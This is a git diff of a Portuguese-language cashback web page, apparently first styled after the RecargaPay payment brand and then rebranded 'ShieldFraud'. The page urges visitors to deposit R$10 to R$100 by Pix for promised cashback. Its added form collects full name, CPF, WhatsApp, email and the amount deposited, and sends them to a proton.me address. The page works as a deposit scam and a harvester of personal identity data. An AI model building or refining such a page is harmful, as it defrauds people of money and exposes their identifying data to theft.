@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RecargaPay Cashback</title>
+  <title>ShieldFraud Cashback</title>
   <style>
     body {
       margin: 0;
@@ -41,7 +40,7 @@
       font-size: 22px;
     }
     .highlight {
-      color: #ff7a00;
+      color: #ff9900;
     }
     .container {
       max-width: 600px;
@@ -53,7 +52,7 @@
       color: #004aad;
     }
     .btn {
-      background-color: #ff7a00;
+      background-color: #ff9900;
       color: white;
       padding: 15px 25px;
       margin: 15px 10px;
@@ -64,32 +63,63 @@
       transition: 0.3s;
     }
     .btn:hover {
-      background-color: #e06700;
+      background-color: #cc7a00;
     }
-    @media (max-width: 480px) {
-      .btn {
-        display: block;
-        margin: 15px auto;
-        width: 80%;
-      }
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    form {
+      margin-top: 20px;
+    }
+    footer {
+      text-align: center;
+      padding: 30px 20px;
+      background-color: #f0f0f0;
+      color: #555;
+      font-size: 13px;
+    }
+    footer a {
+      color: #004aad;
+      text-decoration: none;
     }
   </style>
 </head>
 <body>
   <header>
     <div class="logo">
-      <div class="logo-symbol">$</div>
-      <div class="logo-text">recarga<span class="highlight">pay</span></div>
+      <div class="logo-symbol">S</div>
+      <div class="logo-text">Shield<span class="highlight">Fraud</span></div>
     </div>
   </header>
 
   <div class="container">
     <h1>Escolha um valor ou cadastre-se para receber cashback</h1>
-    <a class="btn" href="valor10.html">Depositar R$10</a>
-    <a class="btn" href="valor25.html">Depositar R$25</a>
-    <a class="btn" href="valor50.html">Depositar R$50</a>
-    <a class="btn" href="valor100.html">Depositar R$100</a>
-    <a class="btn" href="cadastro.html">Cadastrar CPF e Receber Cashback</a>
+    <a class="btn" href="#">Depositar R$10</a>
+    <a class="btn" href="#">Depositar R$25</a>
+    <a class="btn" href="#">Depositar R$50</a>
+    <a class="btn" href="#">Depositar R$100</a>
+    <a class="btn" href="#cadastro">Cadastrar CPF e Receber Cashback</a>
+
+    <div id="cadastro">
+      <h1>Cadastro para Cashback</h1>
+      <form action="mailto:recargapay@proton.me" method="post" enctype="text/plain">
+        <input type="text" name="Nome" placeholder="Nome completo" required><br>
+        <input type="text" name="CPF" placeholder="CPF" required><br>
+        <input type="text" name="WhatsApp" placeholder="WhatsApp" required><br>
+        <input type="email" name="Email" placeholder="E-mail" required><br>
+        <input type="text" name="Valor" placeholder="Valor depositado (ex: R$50,00)" required><br>
+        <input type="submit" class="btn" value="Enviar dados e solicitar cashback">
+      </form>
+    </div>
   </div>
+
+  <footer>
+    <p>Esta plataforma é destinada à distribuição promocional de cashback mediante depósitos via Pix. Ao utilizar este site, você concorda com nossos <a href="#">termos de uso</a> e <a href="#">política de privacidade</a>.</p>
+    <p>CNPJ 11.275.560/0001-75 – Todos os direitos reservados © 2025. ShieldFraud é uma marca independente.</p>
+  </footer>
 </body>
 </html>
